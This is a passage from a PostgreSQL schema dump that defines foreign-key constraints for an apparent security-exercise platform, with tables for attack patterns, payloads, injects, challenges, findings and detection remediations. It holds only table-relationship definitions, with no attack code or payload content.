    ADD CONSTRAINT attack_pattern_id_fk FOREIGN KEY (attack_pattern_id) REFERENCES public.attack_patterns(attack_pattern_id) ON DELETE CASCADE;


--
-- Name: mitigations_attack_patterns attack_pattern_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.mitigations_attack_patterns
    ADD CONSTRAINT attack_pattern_id_fk FOREIGN KEY (attack_pattern_id) REFERENCES public.attack_patterns(attack_pattern_id) ON DELETE CASCADE;


--
-- Name: payloads_attack_patterns attack_pattern_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.payloads_attack_patterns
    ADD CONSTRAINT attack_pattern_id_fk FOREIGN KEY (attack_pattern_id) REFERENCES public.attack_patterns(attack_pattern_id) ON DELETE CASCADE;


--
-- Name: attack_patterns attack_pattern_parent_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.attack_patterns
    ADD CONSTRAINT attack_pattern_parent_fk FOREIGN KEY (attack_pattern_parent) REFERENCES public.attack_patterns(attack_pattern_id) ON DELETE CASCADE;


--
-- Name: challenges_documents challenge_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenges_documents
    ADD CONSTRAINT challenge_id_fk FOREIGN KEY (challenge_id) REFERENCES public.challenges(challenge_id);


--
-- Name: challenges_tags challenge_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenges_tags
    ADD CONSTRAINT challenge_id_fk FOREIGN KEY (challenge_id) REFERENCES public.challenges(challenge_id) ON DELETE CASCADE;


--
-- Name: payloads collector_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.payloads
    ADD CONSTRAINT collector_fk FOREIGN KEY (payload_collector) REFERENCES public.collectors(collector_id) ON DELETE CASCADE;


--
-- Name: communications_users communication_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.communications_users
    ADD CONSTRAINT communication_id_fk FOREIGN KEY (communication_id) REFERENCES public.communications(communication_id) ON DELETE CASCADE;


--
-- Name: contract_output_elements_tags contract_output_element_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.contract_output_elements_tags
    ADD CONSTRAINT contract_output_element_id_fk FOREIGN KEY (contract_output_element_id) REFERENCES public.contract_output_elements(contract_output_element_id) ON DELETE CASCADE;


--
-- Name: contract_output_elements contract_output_element_output_parser_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.contract_output_elements
    ADD CONSTRAINT contract_output_element_output_parser_id_fk FOREIGN KEY (contract_output_element_output_parser_id) REFERENCES public.output_parsers(output_parser_id) ON DELETE CASCADE;


--
-- Name: custom_dashboards_parameters custom_dashboards_parameters_custom_dashboard_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.custom_dashboards_parameters
    ADD CONSTRAINT custom_dashboards_parameters_custom_dashboard_id_fkey FOREIGN KEY (custom_dashboard_id) REFERENCES public.custom_dashboards(custom_dashboard_id) ON DELETE CASCADE;


--
-- Name: widgets custom_dashboards_pkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.widgets
    ADD CONSTRAINT custom_dashboards_pkey FOREIGN KEY (widget_custom_dashboard) REFERENCES public.custom_dashboards(custom_dashboard_id) ON DELETE CASCADE;


--
-- Name: detection_remediations detection_remediations_detection_remediation_payload_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.detection_remediations
    ADD CONSTRAINT detection_remediations_detection_remediation_payload_id_fkey FOREIGN KEY (detection_remediation_payload_id) REFERENCES public.payloads(payload_id) ON DELETE CASCADE;


--
-- Name: challenges_documents document_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenges_documents
    ADD CONSTRAINT document_id_fk FOREIGN KEY (document_id) REFERENCES public.documents(document_id) ON DELETE CASCADE;


--
-- Name: documents_tags document_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.documents_tags
    ADD CONSTRAINT document_id_fk FOREIGN KEY (document_id) REFERENCES public.documents(document_id) ON DELETE CASCADE;


--
-- Name: exercises_documents document_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_documents
    ADD CONSTRAINT document_id_fk FOREIGN KEY (document_id) REFERENCES public.documents(document_id) ON DELETE CASCADE;


--
-- Name: injects_documents document_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_documents
    ADD CONSTRAINT document_id_fk FOREIGN KEY (document_id) REFERENCES public.documents(document_id) ON DELETE CASCADE;


--
-- Name: scenarios_documents document_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_documents
    ADD CONSTRAINT document_id_fk FOREIGN KEY (document_id) REFERENCES public.documents(document_id) ON DELETE CASCADE;


--
-- Name: payloads executable_file_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.payloads
    ADD CONSTRAINT executable_file_fk FOREIGN KEY (executable_file) REFERENCES public.documents(document_id) ON DELETE CASCADE;


--
-- Name: execution_traces execution_traces_execution_agent_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.execution_traces
    ADD CONSTRAINT execution_traces_execution_agent_id_fkey FOREIGN KEY (execution_agent_id) REFERENCES public.agents(agent_id) ON DELETE CASCADE;


--
-- Name: execution_traces execution_traces_execution_inject_status_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.execution_traces
    ADD CONSTRAINT execution_traces_execution_inject_status_id_fkey FOREIGN KEY (execution_inject_status_id) REFERENCES public.injects_statuses(status_id) ON DELETE CASCADE;


--
-- Name: execution_traces execution_traces_execution_inject_test_status_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.execution_traces
    ADD CONSTRAINT execution_traces_execution_inject_test_status_id_fkey FOREIGN KEY (execution_inject_test_status_id) REFERENCES public.injects_tests_statuses(status_id) ON DELETE CASCADE;


--
-- Name: exercises exercise_custom_dashboard_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises
    ADD CONSTRAINT exercise_custom_dashboard_fk FOREIGN KEY (exercise_custom_dashboard) REFERENCES public.custom_dashboards(custom_dashboard_id) ON DELETE SET NULL;


--
-- Name: exercises_documents exercise_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_documents
    ADD CONSTRAINT exercise_id_fk FOREIGN KEY (exercise_id) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: exercises_tags exercise_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_tags
    ADD CONSTRAINT exercise_id_fk FOREIGN KEY (exercise_id) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: scenarios_exercises exercise_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_exercises
    ADD CONSTRAINT exercise_id_fk FOREIGN KEY (exercise_id) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: payloads file_drop_file_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.payloads
    ADD CONSTRAINT file_drop_file_fk FOREIGN KEY (file_drop_file) REFERENCES public.documents(document_id) ON DELETE CASCADE;


--
-- Name: findings_assets finding_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings_assets
    ADD CONSTRAINT finding_id_fk FOREIGN KEY (finding_id) REFERENCES public.findings(finding_id) ON DELETE CASCADE;


--
-- Name: findings_tags finding_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings_tags
    ADD CONSTRAINT finding_id_fk FOREIGN KEY (finding_id) REFERENCES public.findings(finding_id) ON DELETE CASCADE;


--
-- Name: findings_teams finding_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings_teams
    ADD CONSTRAINT finding_id_fk FOREIGN KEY (finding_id) REFERENCES public.findings(finding_id) ON DELETE CASCADE;


--
-- Name: findings_users finding_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings_users
    ADD CONSTRAINT finding_id_fk FOREIGN KEY (finding_id) REFERENCES public.findings(finding_id) ON DELETE CASCADE;


--
-- Name: findings finding_inject_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings
    ADD CONSTRAINT finding_inject_id_fk FOREIGN KEY (finding_inject_id) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: comchecks fk_4e039727729413d0; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.comchecks
    ADD CONSTRAINT fk_4e039727729413d0 FOREIGN KEY (comcheck_exercise) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: grants fk_64adc7d620b0bd5e; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.grants
    ADD CONSTRAINT fk_64adc7d620b0bd5e FOREIGN KEY (grant_group) REFERENCES public.groups(group_id) ON DELETE CASCADE;


--
-- Name: injects_statuses fk_658a47a864e0dbd; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_statuses
    ADD CONSTRAINT fk_658a47a864e0dbd FOREIGN KEY (status_inject) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: objectives fk_6cb0696c157d9150; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.objectives
    ADD CONSTRAINT fk_6cb0696c157d9150 FOREIGN KEY (objective_exercise) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: injects_teams fk_96e1b96c7983aee; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_teams
    ADD CONSTRAINT fk_96e1b96c7983aee FOREIGN KEY (inject_id) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: injects_teams fk_96e1b96ccb0ca5a3; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_teams
    ADD CONSTRAINT fk_96e1b96ccb0ca5a3 FOREIGN KEY (team_id) REFERENCES public.teams(team_id) ON DELETE CASCADE;


--
-- Name: comchecks_statuses fk_a25f787295a4a46f; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.comchecks_statuses
    ADD CONSTRAINT fk_a25f787295a4a46f FOREIGN KEY (status_comcheck) REFERENCES public.comchecks(comcheck_id) ON DELETE CASCADE;


--
-- Name: comchecks_statuses fk_a25f7872b5957bdd; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.comchecks_statuses
    ADD CONSTRAINT fk_a25f7872b5957bdd FOREIGN KEY (status_user) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- Name: tokens fk_aa5a118eef97e32b; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.tokens
    ADD CONSTRAINT fk_aa5a118eef97e32b FOREIGN KEY (token_user) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- Name: injects_expectations fk_agent; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations
    ADD CONSTRAINT fk_agent FOREIGN KEY (agent_id) REFERENCES public.agents(agent_id) ON DELETE CASCADE;


--
-- Name: injects_expectations fk_article; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations
    ADD CONSTRAINT fk_article FOREIGN KEY (article_id) REFERENCES public.articles(article_id) ON DELETE CASCADE;


--
-- Name: articles fk_article_channel; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.articles
    ADD CONSTRAINT fk_article_channel FOREIGN KEY (article_channel) REFERENCES public.channels(channel_id) ON DELETE CASCADE;


--
-- Name: articles fk_article_exercise; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.articles
    ADD CONSTRAINT fk_article_exercise FOREIGN KEY (article_exercise) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: articles_documents fk_article_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.articles_documents
    ADD CONSTRAINT fk_article_id FOREIGN KEY (article_id) REFERENCES public.articles(article_id) ON DELETE CASCADE;


--
-- Name: injects_expectations fk_asset; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations
    ADD CONSTRAINT fk_asset FOREIGN KEY (asset_id) REFERENCES public.assets(asset_id) ON DELETE CASCADE;


--
-- Name: injects_expectations fk_asset_group; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations
    ADD CONSTRAINT fk_asset_group FOREIGN KEY (asset_group_id) REFERENCES public.asset_groups(asset_group_id) ON DELETE CASCADE;


--
-- Name: attack_patterns_kill_chain_phases fk_attack_pattern_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.attack_patterns_kill_chain_phases
    ADD CONSTRAINT fk_attack_pattern_id FOREIGN KEY (attack_pattern_id) REFERENCES public.attack_patterns(attack_pattern_id) ON DELETE CASCADE;


--
-- Name: injects_expectations fk_challenge; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations
    ADD CONSTRAINT fk_challenge FOREIGN KEY (challenge_id) REFERENCES public.challenges(challenge_id) ON DELETE CASCADE;


--
-- Name: challenge_attempts fk_challenge_attempt_challenge; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenge_attempts
    ADD CONSTRAINT fk_challenge_attempt_challenge FOREIGN KEY (challenge_id) REFERENCES public.challenges(challenge_id) ON DELETE CASCADE;


--
-- Name: challenge_attempts fk_challenge_attempt_inject_status; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenge_attempts
    ADD CONSTRAINT fk_challenge_attempt_inject_status FOREIGN KEY (inject_status_id) REFERENCES public.injects_statuses(status_id) ON DELETE CASCADE;


--
-- Name: challenge_attempts fk_challenge_attempt_user; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenge_attempts
    ADD CONSTRAINT fk_challenge_attempt_user FOREIGN KEY (user_id) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- Name: collectors fk_collector_security_platform; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.collectors
    ADD CONSTRAINT fk_collector_security_platform FOREIGN KEY (collector_security_platform) REFERENCES public.assets(asset_id) ON DELETE SET NULL;


--
-- Name: communications fk_communication_inject; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.communications
    ADD CONSTRAINT fk_communication_inject FOREIGN KEY (communication_inject) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: vulnerability_reference_urls fk_cve_refurl; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.vulnerability_reference_urls
    ADD CONSTRAINT fk_cve_refurl FOREIGN KEY (vulnerability_id) REFERENCES public.vulnerabilities(vulnerability_id) ON DELETE CASCADE;


--
-- Name: vulnerabilities_cwes fk_cves_cwes_cve; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.vulnerabilities_cwes
    ADD CONSTRAINT fk_cves_cwes_cve FOREIGN KEY (vulnerability_id) REFERENCES public.vulnerabilities(vulnerability_id) ON DELETE CASCADE;


--
-- Name: vulnerabilities_cwes fk_cves_cwes_cwe; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.vulnerabilities_cwes
    ADD CONSTRAINT fk_cves_cwes_cwe FOREIGN KEY (cwe_id) REFERENCES public.cwes(cwe_id) ON DELETE CASCADE;


--
-- Name: injects fk_depends_from_another; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects
    ADD CONSTRAINT fk_depends_from_another FOREIGN KEY (inject_depends_from_another) REFERENCES public.injects(inject_id) ON DELETE SET NULL;


--
-- Name: articles_documents fk_document_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.articles_documents
    ADD CONSTRAINT fk_document_id FOREIGN KEY (document_id) REFERENCES public.documents(document_id) ON DELETE CASCADE;


--
-- Name: evaluations fk_evaluation_objective; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.evaluations
    ADD CONSTRAINT fk_evaluation_objective FOREIGN KEY (evaluation_objective) REFERENCES public.objectives(objective_id) ON DELETE CASCADE;


--
-- Name: evaluations fk_evaluation_user; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.evaluations
    ADD CONSTRAINT fk_evaluation_user FOREIGN KEY (evaluation_user) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- Name: variables fk_exercice_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.variables
    ADD CONSTRAINT fk_exercice_id FOREIGN KEY (variable_exercise) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: exercise_mails_reply_to fk_exercise_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercise_mails_reply_to
    ADD CONSTRAINT fk_exercise_id FOREIGN KEY (exercise_id) REFERENCES public.exercises(exercise_id);


--
-- Name: exercises_teams fk_exercise_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_teams
    ADD CONSTRAINT fk_exercise_id FOREIGN KEY (exercise_id) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: exercises_teams_users fk_exercise_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_teams_users
    ADD CONSTRAINT fk_exercise_id FOREIGN KEY (exercise_id) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: exercises fk_exercise_logo_dark; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises
    ADD CONSTRAINT fk_exercise_logo_dark FOREIGN KEY (exercise_logo_dark) REFERENCES public.documents(document_id) ON DELETE SET NULL;


--
-- Name: exercises fk_exercise_logo_light; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises
    ADD CONSTRAINT fk_exercise_logo_light FOREIGN KEY (exercise_logo_light) REFERENCES public.documents(document_id) ON DELETE SET NULL;


--
-- Name: exercises fk_exercise_security_coverage; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises
    ADD CONSTRAINT fk_exercise_security_coverage FOREIGN KEY (exercise_security_coverage) REFERENCES public.security_coverages(security_coverage_id) ON DELETE SET NULL;


--
-- Name: injects_expectations fk_expectation_exercise; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations
    ADD CONSTRAINT fk_expectation_exercise FOREIGN KEY (exercise_id) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: injects_expectations fk_expectation_inject; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations
    ADD CONSTRAINT fk_expectation_inject FOREIGN KEY (inject_id) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: injects_expectations fk_expectations_team; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations
    ADD CONSTRAINT fk_expectations_team FOREIGN KEY (team_id) REFERENCES public.teams(team_id) ON DELETE CASCADE;


--
-- Name: injects_expectations fk_expectations_user; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations
    ADD CONSTRAINT fk_expectations_user FOREIGN KEY (user_id) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- Name: logs fk_f08fc65c9cfd383c; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.logs
    ADD CONSTRAINT fk_f08fc65c9cfd383c FOREIGN KEY (log_user) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- Name: logs fk_f08fc65cc0891ec3; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.logs
    ADD CONSTRAINT fk_f08fc65cc0891ec3 FOREIGN KEY (log_exercise) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: users_groups fk_ff8ab7e0a76ed395; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.users_groups
    ADD CONSTRAINT fk_ff8ab7e0a76ed395 FOREIGN KEY (user_id) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- Name: users_groups fk_ff8ab7e0fe54d947; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.users_groups
    ADD CONSTRAINT fk_ff8ab7e0fe54d947 FOREIGN KEY (group_id) REFERENCES public.groups(group_id) ON DELETE CASCADE;


--
-- Name: challenges_flags fk_flag_challenge; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenges_flags
    ADD CONSTRAINT fk_flag_challenge FOREIGN KEY (flag_challenge) REFERENCES public.challenges(challenge_id) ON DELETE CASCADE;


--
-- Name: injects fk_inject_exercise; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects
    ADD CONSTRAINT fk_inject_exercise FOREIGN KEY (inject_exercise) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: injects fk_injects_user_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects
    ADD CONSTRAINT fk_injects_user_id FOREIGN KEY (inject_user) REFERENCES public.users(user_id) ON DELETE SET NULL;


--
-- Name: lessons_answers fk_lessons_answer_question; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_answers
    ADD CONSTRAINT fk_lessons_answer_question FOREIGN KEY (lessons_answer_question) REFERENCES public.lessons_questions(lessons_question_id) ON DELETE CASCADE;


--
-- Name: lessons_answers fk_lessons_answer_user; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_answers
    ADD CONSTRAINT fk_lessons_answer_user FOREIGN KEY (lessons_answer_user) REFERENCES public.users(user_id) ON DELETE SET NULL;


--
-- Name: lessons_categories fk_lessons_category_exercise; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_categories
    ADD CONSTRAINT fk_lessons_category_exercise FOREIGN KEY (lessons_category_exercise) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: lessons_questions fk_lessons_question_category; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_questions
    ADD CONSTRAINT fk_lessons_question_category FOREIGN KEY (lessons_question_category) REFERENCES public.lessons_categories(lessons_category_id) ON DELETE CASCADE;


--
-- Name: lessons_template_categories fk_lessons_template_category_template; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_template_categories
    ADD CONSTRAINT fk_lessons_template_category_template FOREIGN KEY (lessons_template_category_template) REFERENCES public.lessons_templates(lessons_template_id) ON DELETE CASCADE;


--
-- Name: lessons_template_questions fk_lessons_template_question_category; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_template_questions
    ADD CONSTRAINT fk_lessons_template_question_category FOREIGN KEY (lessons_template_question_category) REFERENCES public.lessons_template_categories(lessons_template_category_id) ON DELETE CASCADE;


--
-- Name: channels fk_media_logo_dark; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.channels
    ADD CONSTRAINT fk_media_logo_dark FOREIGN KEY (channel_logo_dark) REFERENCES public.documents(document_id) ON DELETE SET NULL;


--
-- Name: channels fk_media_logo_light; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.channels
    ADD CONSTRAINT fk_media_logo_light FOREIGN KEY (channel_logo_light) REFERENCES public.documents(document_id) ON DELETE SET NULL;


--
-- Name: pauses fk_pause_exercise; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.pauses
    ADD CONSTRAINT fk_pause_exercise FOREIGN KEY (pause_exercise) REFERENCES public.exercises(exercise_id) ON DELETE CASCADE;


--
-- Name: attack_patterns_kill_chain_phases fk_phase_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.attack_patterns_kill_chain_phases
    ADD CONSTRAINT fk_phase_id FOREIGN KEY (phase_id) REFERENCES public.kill_chain_phases(phase_id) ON DELETE CASCADE;


--
-- Name: detection_remediations fk_remediation_collector_type; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.detection_remediations
    ADD CONSTRAINT fk_remediation_collector_type FOREIGN KEY (detection_remediation_collector_type) REFERENCES public.collectors(collector_type) ON DELETE CASCADE;


--
-- Name: scenario_mails_reply_to fk_scenario_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenario_mails_reply_to
    ADD CONSTRAINT fk_scenario_id FOREIGN KEY (scenario_id) REFERENCES public.scenarios(scenario_id);


--
-- Name: assets fk_security_platform_logo_dark; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.assets
    ADD CONSTRAINT fk_security_platform_logo_dark FOREIGN KEY (security_platform_logo_dark) REFERENCES public.documents(document_id) ON DELETE SET NULL;


--
-- Name: assets fk_security_platform_logo_light; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.assets
    ADD CONSTRAINT fk_security_platform_logo_light FOREIGN KEY (security_platform_logo_light) REFERENCES public.documents(document_id) ON DELETE SET NULL;


--
-- Name: exercises_teams fk_team_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_teams
    ADD CONSTRAINT fk_team_id FOREIGN KEY (team_id) REFERENCES public.teams(team_id) ON DELETE CASCADE;


--
-- Name: exercises_teams_users fk_team_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_teams_users
    ADD CONSTRAINT fk_team_id FOREIGN KEY (team_id) REFERENCES public.teams(team_id) ON DELETE CASCADE;


--
-- Name: users_teams fk_team_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.users_teams
    ADD CONSTRAINT fk_team_id FOREIGN KEY (team_id) REFERENCES public.teams(team_id) ON DELETE CASCADE;


--
-- Name: teams fk_teams_organizations; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.teams
    ADD CONSTRAINT fk_teams_organizations FOREIGN KEY (team_organization) REFERENCES public.organizations(organization_id) ON DELETE SET NULL;


--
-- Name: exercises_teams_users fk_user_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_teams_users
    ADD CONSTRAINT fk_user_id FOREIGN KEY (user_id) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- Name: users_teams fk_user_id; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.users_teams
    ADD CONSTRAINT fk_user_id FOREIGN KEY (user_id) REFERENCES public.users(user_id) ON DELETE CASCADE;


--
-- Name: users fk_users_organizations; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.users
    ADD CONSTRAINT fk_users_organizations FOREIGN KEY (user_organization) REFERENCES public.organizations(organization_id) ON DELETE SET NULL;


--
-- Name: groups_roles group_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.groups_roles
    ADD CONSTRAINT group_id_fk FOREIGN KEY (group_id) REFERENCES public.groups(group_id);


--
-- Name: injects_expectations_traces inject_expectation_trace_source_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations_traces
    ADD CONSTRAINT inject_expectation_trace_source_id_fk FOREIGN KEY (inject_expectation_trace_source_id) REFERENCES public.assets(asset_id) ON DELETE CASCADE;


--
-- Name: injects_asset_groups inject_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_asset_groups
    ADD CONSTRAINT inject_id_fk FOREIGN KEY (inject_id) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: injects_assets inject_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_assets
    ADD CONSTRAINT inject_id_fk FOREIGN KEY (inject_id) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: injects_documents inject_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_documents
    ADD CONSTRAINT inject_id_fk FOREIGN KEY (inject_id) REFERENCES public.injects(inject_id) ON DELETE CASCADE;


--
-- Name: injects_tags inject_id_fk; Type: FK CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_tags
